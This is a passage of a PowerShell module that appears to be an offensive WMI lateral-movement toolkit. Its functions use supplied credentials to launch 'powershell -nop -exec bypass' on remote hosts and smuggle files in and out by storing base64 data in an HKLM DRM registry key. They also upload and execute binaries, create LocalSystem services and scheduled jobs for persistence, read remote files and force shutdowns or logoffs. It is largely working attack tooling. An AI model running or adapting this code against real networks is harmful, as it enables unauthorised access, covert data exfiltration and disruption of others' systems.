                        $filter += " LIKE '$ext' "
                    }
                    else 
                    {
                        $filter += " = '$ext' "
                    }
                    $counter += 1
                }
            }
            $filter += "AND Drive='$drive'"
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $computer
        }
    }
}

function Invoke-FileTransferOverWMI
{
<#
    .SYNOPSIS
    This function is used to transfer a file over WMI.

    .DESCRIPTION
    This function is used to transfer a file over WMI.  It uses WMI to run powershell, base64 encode a file, place it in a registry key, downloads the key, and writes it out to disk.

    .PARAMETER RemtoteUser
    Specify a username for connecting to the remote system.  Needs to be local admin.

    .PARAMETER RemotePass
    Specify the password for the appropriate user.

    .PARAMETER LocalUser
    Specify a username for connecting back to the local system.  Needs to be local admin.

    .PARAMETER LocalPass
    Specify a password for local user account which connects back to local system.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER File
    File to download from remote system.

    .PARAMETER Download
    Full path on local system to download file (including the file itself)

    .PARAMETER Upload
    Full path on remote system to upload file (including the file itself)

    .PARAMETER Execute
    Execute/run the uploaded or downloaded file

    .EXAMPLE
    > Transfer-FilesOverWmi -User Chris -Pass password -Targets win7workstation -File C:\Users\Chris\Desktop\test.txt -Download C:\Users\test\Downloads
    
    .Example
    > Transfer-FilesOverWmi -Targets win7workstation -File C:\temp\apple.dmg -Upload C:\temp
    This will attempt to authenticate to the win7workstation machine with the current account to best guess if a user is active on the remote machine.

    .LINK
    https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-WmiCommand.ps1
    http://www.getautomationmachine.com/en/company/news/item/embedding-files-in-powershell-scripts
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$RemoteUser,
        [Parameter(Mandatory = $False)]
        [string]$RemotePass,
        [Parameter(Mandatory = $False)]
        [string]$LocalUser,
        [Parameter(Mandatory = $False)]
        [string]$LocalPass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
        [string[]]$TARGETS = ".",
        [Parameter(Mandatory=$false,ParameterSetName='upload')]
        [Parameter(ParameterSetName='download')]
        [string]$File,
        [Parameter(Mandatory = $False, ParameterSetName='download')]
        [string]$Download,
        [Parameter(Mandatory = $False, ParameterSetName='upload')]
        [string]$Upload,
        [Parameter(Mandatory = $False,ParameterSetName='upload')]
        [Parameter(ParameterSetName='download')]
        [switch]$Execute
    )
    Process
    {
        # invoke powershell on both remote and local system.  Both will connect back over WMI to retrieve file contents
        # applies to both download and upload operations.
        # Uses HKLM/Software/Microsoft/DRM to store data, because fuck DRM
        #2147483650 - hklm, 2147483649 - kkcu, 

        $fullregistrypath = "HKLM:\Software\Microsoft\DRM"
        $registryupname = "Never"
        $registrydownname = "Ever"
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\DRM"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        if(($RemoteUser -and $RemotePass) -and ($LocalUser -and $LocalPass))
        {
            $remotepassword = ConvertTo-SecureString $RemotePass -asplaintext -force 
            $remotecred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $RemoteUser,$remotepassword
            $localpassword = ConvertTo-SecureString $LocalPass -asplaintext -force 
            $localcred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $LocalUser,$localpassword
            Foreach($computer in $TARGETS)
            {
                if($Upload)
                {
                    # Read in file and base64 encode it
                    Write-Verbose "Read in local file and base64 encode it"
                    $filecontents = Get-Content -Encoding byte $File
                    $filecontentencoded = [System.Convert]::ToBase64String($filecontents)

                    Write-Verbose "Writing encoded file to local registry"
                    $localkey = New-ItemProperty -Path $fullregistrypath -Name $registryupname -Value $filecontentencoded -PropertyType String -Force

                    # grabs registry value and saves to disk
                    Write-Verbose "Connecting to $computer"
                    $remote_posh = '$Hive = 2147483650; $key = ''SOFTWARE\Microsoft\DRM''; $value = ''Never''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -Computer ' + "$SystemHostname" + ' -Credential $crd; $decode = [System.Convert]::FromBase64String($out.sValue); Set-Content -Path ' + "$Upload" + ' -Value $decode -Encoding Byte'
                    $remote_posh = 'powershell -nop -exec bypass -c "' + $remote_posh + '"'
                    Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -Credential $remotecred -Computername $computer

                    Write-Verbose "Sleeping to let remote system execute WMI command"
                    Start-Sleep -s 10

                    # Remove registry key
                    Write-Verbose "Removing registry value storing uploaded file"
                    $local_reg = Remove-ItemProperty -Path $fullregistrypath -Name $registryupname

                    if($Execute)
                    {
                        Write-Verbose "Executing file on remote system"
                        Invoke-ExecCommandWMI -User $RemoteUser -Pass $RemotePass -Command $Upload -Targets $computer
                    }

                    Write-Verbose "Done!"
                }

                elseif($Download)
                {
                    # On remote system, save file to registry
                    Write-Verbose "Reading remote file and writing on remote registry"
                    $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
                    $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
                    Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $remotecred -Computername $computer
                    Write-Verbose "Sleeping to let remote system read and store file"
                    Start-Sleep -s 15

                    # Grab file from remote system's registry
                    Write-Verbose "Reading file from remote registry"
                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -Computer $computer -Credential $remotecred
                    $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
                    Set-Content -Path $Download -Value $decode -Encoding Byte

                    # Removing Registry value from remote system
                    Write-Verbose "Removing registry value from remote system"
                    Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -Computer $computer -Credential $remotecred

                    Write-Verbose "Done!"
                }

            }
        }

        else
        {
            Throw "You need to provide usernames, passwords, and the system to target!"
        }
    }
}

function Get-SystemDrivesWMI
{
    <#
    .SYNOPSIS
    This function lists local and network drives connected to the target system.

    .DESCRIPTION
    This function lists local and network drives connected to the target system.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER Targets
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .EXAMPLE
    > Get-SystemDrivesWMI -Targets win7pc
    This command connects to the remote system over wmi with the current credentials it is using and enumerates drives (local and network) on the win7pc system.

    .EXAMPLE
    > Get-SystemDrivesWMI -Targets win7pc2 -User test\chris -Pass Chris
    This commands uses the credentials provided to list local and network drives on the win7pc2 system

    .LINK
    http://blogs.technet.com/b/heyscriptingguy/archive/2013/08/28/powertip-use-powershell-to-get-a-list-of-all-volumes.aspx
    #>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$Targets = "."
    )

    Process
    {
        if($User -and $Pass)
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                $filter = "DriveType = '4' OR DriveType = '3'"
                Get-WmiObject -class win32_logicaldisk -ComputerName $computer -Filter $filter -Credential $cred
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                $filter = "DriveType = '4' OR DriveType = '3'"
                Get-WmiObject -class win32_logicaldisk  -ComputerName $computer -Filter $filter
            }
        }

        else
        {
            # If this area of code is invoked, it runs the command on the same machine the script is loaded
            $filter = "DriveType = '4' OR DriveType = '3'"
            Get-WmiObject -class win32_logicaldisk -Filter $filter
        }
        
    }

    end{}
}

function Get-ActiveNICSWMI
{
    <#
    .SYNOPSIS
    This function lists local and network drives connected to the target system.

    .DESCRIPTION
    This function lists local and network drives connected to the target system.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER Targets
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .EXAMPLE
    > Get-ActiveNICSWMI -Targets win7pc
    This command connects to the remote system over wmi with the current credentials and gathers a list of active network adapters.

    .EXAMPLE
    > Get-ActiveNICSWMI -Targets win7pc2 -User test\chris -Pass Chris
    This commands uses the credentials provided to gather a list of NICs with active connections on the win7pc2 system

    .LINK
    http://blogs.technet.com/b/heyscriptingguy/archive/2011/10/07/use-powershell-to-identify-your-real-network-adapter.aspx
    #>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$Targets = "."
    )

    Process
    {
        if($User -and $Pass)
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $computer -Credential $cred
                foreach($nic in $adapters)
                {
                    if($nic.IPAddress -ne $null)
                    {
                        $nic
                    }
                }
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $computer
                foreach($nic in $adapters)
                {
                    if($nic.IPAddress -ne $null)
                    {
                        $nic
                    }
                }
            }
        }

        else
        {
            # If this area of code is invoked, it runs the command on the same machine the script is loaded
            $adapters = Get-WmiObject -class win32_networkadapterconfiguration
                foreach($nic in $adapters)
                {
                    if($nic.IPAddress -ne $null)
                    {
                        $nic
                    }
                }
        }
        
    }

    end{}
}

function Invoke-SchedJobManipulation
{
    <#
    .SYNOPSIS
    This function lists, creates, or deletes scheduled jobs on the target machine.

    .DESCRIPTION
    This function lists, creates, or deletes scheduled jobs on the target machine.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER Targets
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER List
    Switch to list scheduled jobs on the target system

    .PARAMETER Create
    String containing the path to the file that you would like to schedule to run

    .PARAMETER Delete
    String containing the job ID number to delete

    .PARAMETER Time
    The time you want a job to execute at

    .EXAMPLE
    > Invoke-SchedJobManipulation -Targets win7pc -List
    This command connects to the remote system over wmi with the current credentials and lists all scheduled jobs on the system.

    .EXAMPLE
    > Invoke-SchedJobManipulation -Targets win7pc2 -User test\chris -Pass Chris -Delete 1
    This commands uses the credentials provided to delete the scheduled task with the ID of 1 on the target system

    .EXAMPLE
    > Invoke-SchedJobManipulation -Targets win7pc2 -User test\chris -Pass Chris -Create notepad.exe -time 14:04
    This commands uses the credentials provided to create a job that runs notepad.exe at 14:04

    .LINK
    http://blogs.technet.com/b/heyscriptingguy/archive/2009/03/31/how-can-i-list-and-delete-scheduled-jobs.aspx
    #>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$User,
        [Parameter(Mandatory = $False)]
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
        [string[]]$Targets = ".",
        [Parameter(Mandatory = $False,ParameterSetName='list')]
        [switch]$List,
        [Parameter(Mandatory = $False,ParameterSetName='create')]
        [string]$Create,
        [Parameter(Mandatory = $False,ParameterSetName='delete')]
        [string]$Delete,
        [Parameter(Mandatory = $False,ParameterSetName='create')]
        [string]$time
    )

    Process
    {
        if($User -and $Pass)
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                If($List)
                {
                    $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $computer -Credential $cred
                    foreach($job in $jobs)
                    {
                        if($job -ne $null)
                        {
                            $job
                            Write-Output "Start Time: " $job.StartTime
                        }
                    }
                }

                elseif($Delete)
                {
                    Write-Verbose "Deleting job $Delete"
                    $job = Get-WmiObject -class win32_scheduledjob -ComputerName $computer -Credential $cred -Filter "jobID = $Delete"
                    $job.delete()
                    Write-Verbose "Job $Delete has been removed"                    
                }

                elseif($Create)
                {
                    Write-Verbose "Creating job on remote system"
                    $wmi_sched_job = [wmiclass]"\\$env:computername\root\cimv2:win32_scheduledjob"
                    $time = $wmi_sched_job.ConvertFromDateTime($time)
                    (Get-WmiObject -list win32_scheduledjob -ComputerName $computer -Credential $cred).Create($Create,$time)
                }
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                If($List)
                {
                    $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $computer
                    foreach($job in $jobs)
                    {
                        if($job -ne $null)
                        {
                            $job
                            Write-Output "Start Time: " $job.StartTime
                        }
                    }
                }

                elseif($Delete)
                {
                    Write-Verbose "Deleting job $Delete"
                    $job = Get-WmiObject -class win32_scheduledjob -ComputerName $computer -Filter "jobID = $Delete"
                    $job.delete()
                    Write-Verbose "Job $Delete has been removed"                    
                }

                elseif($Create)
                {
                    Write-Verbose "Creating job on remote system"
                    $wmi_sched_job = [wmiclass]"\\$env:computername\root\cimv2:win32_scheduledjob"
                    $time = $wmi_sched_job.ConvertFromDateTime($time)
                    (Get-WmiObject -list win32_scheduledjob -ComputerName $computer).Create($Create,$time)
                }
            }
        }

        else
        {
            # If this area of code is invoked, it runs the command on the same machine the script is loaded
            If($List)
            {
                $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $computer
                foreach($job in $jobs)
                {
                    if($job -ne $null)
                    {
                        $job
                        Write-Output "Start Time: " $job.StartTime
                    }
                }
            }

            elseif($Delete)
            {
                Write-Verbose "Deleting job $Delete"
                $job = Get-WmiObject -class win32_scheduledjob -ComputerName $computer -Filter "jobID = $Delete"
                $job.delete()
                Write-Verbose "Job $Delete has been removed"                    
            }

            elseif($Create)
            {
                Write-Verbose "Creating job on remote system"
                $wmi_sched_job = [wmiclass]"\\$env:computername\root\cimv2:win32_scheduledjob"
                $time = $wmi_sched_job.ConvertFromDateTime($time)
                (Get-WmiObject -list win32_scheduledjob -ComputerName $computer).Create($Create,$time)
            }
        }
    }

    end{}
}

function Invoke-ServiceManipulation
{
    <#
    .SYNOPSIS
    This function starts and stops systems on a target system.

    .DESCRIPTION
    This function starts and stops systems on a target system.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER Targets
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER Service
    Name of the service to manipulate.

    .PARAMETER Start
    Starts the specified service

    .PARAMETER Stop
    Stops the specified service

    .PARAMETER Create
    Creates a new service

    .PARAMETER NewServiceName
    Name for the service

    .PARAMETER NewServicePath
    Path to executable

    .EXAMPLE
    Invoke-ServiceManipulation -User Chris -Pass password -Service RemoteRegistry -Start -Targets windows1
    This example starts the remote registry on the windows1 system after authenticating as "Chris"

    .EXAMPLE
    Invoke-ServiceManipulation -User Chris -Pass password -Service RemoteRegistry -Stop -Targets windows1
    This example starts the remote registry on the windows1 system after authenticating as "Chris"

    .EXAMPLE
    Invoke-ServiceManipulation -User Chris -Pass password -Create -NewServiceName Test1 -NewServicePath C:\File.exe
    This example creates a service called "Test1" with the binary located at C:\File.exe

    .LINK
    http://learningpcs.blogspot.com/2012/04/powershell-v2-invoke-wmimethod-create.html
    #>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$Targets = ".",
        [Parameter(Mandatory = $False,ParameterSetName='start')]
        [Parameter(ParameterSetName='stop')]
        [Parameter(ParameterSetName='delete')]
        [string]$Service,
        [Parameter(Mandatory = $False,ParameterSetName='start')] 
        [switch]$Start,
        [Parameter(Mandatory = $False,ParameterSetName='stop')] 
        [switch]$Stop,
        [Parameter(Mandatory = $False,ParameterSetName='create')] 
        [switch]$Create,
        [Parameter(Mandatory = $False,ParameterSetName='create')] 
        [string]$NewServiceName,
        [Parameter(Mandatory = $False,ParameterSetName='create')] 
        [string]$NewServicePath,
        [Parameter(Mandatory = $False,ParameterSetName='delete')] 
        [switch]$Delete
    )

    Process
    {
        if($User -and $Pass)
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                if ($Start -or $Stop -or $Delete)
                {
                    $filter = "name='$Service'"
                    $SystemService = Get-WmiObject -class win32_service -ComputerName $computer -Filter $filter -Credential $cred
                    if($Start)
                    {
                        $SystemService.StartService()
                    }
                    elseif($Stop)
                    {
                        $SystemService.StopService()
                    }
                    elseif($Delete)
                    {
                        $SystemService.Delete()
                    }
                }
                elseif($Create)
                {
                    $args = $false,$NewServiceName,0,$null,$null,$NewServiceName,$NewServicePath,$null,16,"Automatic","LocalSystem",$null
                    Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $computer -Credential $cred
                }
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                if ($Start -or $Stop -or $Delete)
                {
                    $filter = "name='$Service'"
                    $SystemService = Get-WmiObject -class win32_service -ComputerName $computer -Filter $filter
                    if($Start)
                    {
                        $SystemService.StartService()
                    }
                    elseif($Stop)
                    {
                        $SystemService.StopService()
                    }
                    elseif($Delete)
                    {
                        $SystemService.Delete()
                    }
                }
                elseif($Create)
                {
                    $args = $false,$NewServiceName,0,$null,$null,$NewServiceName,$NewServicePath,$null,16,"Automatic","LocalSystem",$null
                    Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $computer
                }
            }
        }

        else
        {
            # If this area of code is invoked, it runs the command on the same machine the script is loaded
            if ($Start -or $Stop -or $Delete)
            {
                $filter = "name='$Service'"
                $SystemService = Get-WmiObject -class win32_service -Filter $filter
                if($Start)
                {
                    $SystemService.StartService()
                }
                elseif($Stop)
                {
                    $SystemService.StopService()
                }
                elseif($Delete)
                {
                    $SystemService.Delete()
                }
            }
            elseif($Create)
            {
                $args = $false,$NewServiceName,0,$null,$null,$NewServiceName,$NewServicePath,$null,16,"Automatic","LocalSystem",$null
                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $computer
            }
        }
        
    }

    end{}
}

function Invoke-DirectoryListing
{
<#
    .SYNOPSIS
    This function will use wmi to invoke powershell, download a powershell script in memory, and post its output back to a system you specify.

    .DESCRIPTION
    This function will use wmi to invoke powershell, download a powershell script in memory, and post its output back to a system you specify.  You will want to use the included https server (python).

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER Directory
    The URL to the powershell script that will be downloaded and run.

    .EXAMPLE
    Invoke-DirectoryListing -User chris -Pass password -targets win7pc -Directory C:\Users
    This uses the credentials provided to authenticate to the win7pc system and give a directory listing of everything within C:\Users
    
    .LINK
    http://powershell.com/cs/blogs/tips/archive/2009/04/07/accessing-individual-files-and-folders-remotely-via-wmi.aspx

#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = ".",
        [Parameter(Mandatory = $False)] 
        [string]$Directory
    )

    Process
    {

        if($User -and $Pass)
        {
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                $Drive = $Directory.Substring(0,2)
                $DirPath = $Directory.Substring(2)
                $DirPath = $DirPath.Replace("\","\\")
                if(!$DirPath.Endswith('\\'))
                {
                    $DirPath += "\\"
                }
                Write-Verbose "Connecting to $computer"
                $filter = "Drive='$Drive' and Path='$DirPath'"
                $listing = Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $computer -Credential $cred
                foreach($list in $listing)
                {
                    $list.Name
                }
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                $Drive = $Directory.Substring(0,2)
                $DirPath = $Directory.Substring(2)
                $DirPath = $DirPath.Replace("\","\\")
                if(!$DirPath.Endswith('\\'))
                {
                    $DirPath += "\\"
                }
                Write-Verbose "Connecting to $computer"
                $filter = "Drive='$Drive' and Path='$DirPath'"
                $listing = Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $computer -Credential $cred
                foreach($list in $listing)
                {
                    $list.Name
                }
            }
        }

        else
        {
            # If this area of code is invoked, it runs the command on the same machine the script is loaded
            $Drive = $Directory.Substring(0,2)
            $DirPath = $Directory.Substring(2)
            $DirPath = $DirPath.Replace("\","\\")
            if(!$DirPath.Endswith('\\'))
            {
                $DirPath += "\\"
            }
            Write-Verbose "Connecting to $computer"
            $filter = "Drive='$Drive' and Path='$DirPath'"
            $listing = Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $computer -Credential $cred
            foreach($list in $listing)
            {
                $list.Name
            }
        }
    }
    end{}
}

function Get-FileContentsWMI
{
    <#
    .SYNOPSIS
    This function attempts to read a file's contents and display it to you over WMI.

    .DESCRIPTION
    This function attempts to read a file's contents and display it to you over WMI by running powershell on the remote system.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER Targets
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER File
    File that you'd like to have the contents of/read

    .EXAMPLE
    > Get-FileContentsWMI -Targets win7pc2 -User test\chris -Pass Chris -File C:\file.txt
    This commands uses the credentials provided to read the file C:\file.txt from the win7pc2 system and display its contents to the console.

    .EXAMPLE
    > Get-FileContentsWMI -Targets win7pc2 -File C:\file2.txt
    This commands uses the context of the current user to read the file C:\file2.txt from the win7pc2 system and display its contents to the console.

    #>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$Targets = ".",
        [Parameter(Mandatory = $False)] 
        [string]$File
    )

    Process
    {
        $fullregistrypath = "HKLM:\Software\Microsoft\DRM"
        $registrydownname = "ReadMe"
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\DRM"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
        if($User -and $Pass)
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                # On remote system, save file to registry
                Write-Verbose "Reading remote file and writing on remote registry"
                $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
                $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $cred -Computername $computer
                Write-Verbose "Sleeping to let remote system read and store file"
                Start-Sleep -s 15

                # Grab file from remote system's registry
                Write-Verbose "Reading file from remote registry"
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -Computer $computer -Credential $cred
                $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
                # Print to console
                $enc = [System.Text.Encoding]::ASCII
                $enc.GetString($decode)

                # Removing Registry value from remote system
                Write-Verbose "Removing registry value from remote system"
                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -Computer $computer -Credential $cred

                Write-Verbose "Done!"
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                # On remote system, save file to registry
                Write-Verbose "Reading remote file and writing on remote registry"
                $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
                $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Computername $computer
                Write-Verbose "Sleeping to let remote system read and store file"
                Start-Sleep -s 15

                # Grab file from remote system's registry
                Write-Verbose "Reading file from remote registry"
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -Computer $computer
                $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
                # Print to console
                $enc = [System.Text.Encoding]::ASCII
                $enc.GetString($decode)

                # Removing Registry value from remote system
                Write-Verbose "Removing registry value from remote system"
                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -Computer $computer

                Write-Verbose "Done!"
            }
        }
        
    }

    end{}
}

function Invoke-PowerOptionsWMI
{
<#
    .SYNOPSIS
    This function uses WMI to log off a user, reboot, or shutdown the targeted system.

    .DESCRIPTION
    This function uses WMI to log off a user, reboot, or shutdown the targeted system.  It does so by force performing the action specified.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER Shutdown
    Force shuts down the targeted system

    .PARAMETER Reboot
    Force reboots the targeted system

    .PARAMETER Logoff
    Force logs off any user on the targeted system

    .EXAMPLE
    Invoke-PowerOptionsWMI -User chris -Pass password -targets win7pc -Logoff
    This function uses the provided credentials to authenticate to the target machine and logoff all users

    .EXAMPLE
    Invoke-PowerOptionsWMI -User chris -Pass password -targets win7pc -Shutdown
    This function uses the provided credentials to authenticate to the target machine and shuts down the system.
    
    .LINK
    http://lizardsystems.com/wiki/articles/shutdown_power_off_or_reboot_a_remote_computer_from_powershell
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = ".",
        [Parameter(Mandatory = $False, ParameterSetName='shutdown')] 
        [switch]$Shutdown,
        [Parameter(Mandatory = $False, ParameterSetName='reboot')] 
        [switch]$Reboot,
        [Parameter(Mandatory = $False, ParameterSetName='logoff')] 
        [switch]$Logoff
    )

    Process
    {

        if($User -and $Pass)
        {
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                if($Shutdown)
                {
                    $power_option = 5
                }
                elseif($Reboot)
                {
                    $power_option = 6
                }
                elseif($Logoff)
                {
                    $power_option = 4
                }
                else
                {
                    Write-Verbose "Not sure how you hit this unless you didn't provide a power options to do.  Please restart!"
                    exit
                }

                Write-Verbose "Connecting to $computer"
                (gwmi win32_operatingsystem -Credential $cred -ComputerName $computer).Win32Shutdown($power_option)

            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                if($Shutdown)
                {
                    $power_option = 5
                }
                elseif($Reboot)
                {
                    $power_option = 6
                }
                elseif($Logoff)
                {
                    $power_option = 4
                }
                else
                {
                    Write-Verbose "Not sure how you hit this unless you didn't provide a power options to do.  Please restart!"
                    exit
                }

                Write-Verbose "Connecting to $computer"
                (gwmi win32_operatingsystem -ComputerName $computer).Win32Shutdown($power_option)
            }
        }

        else
        {
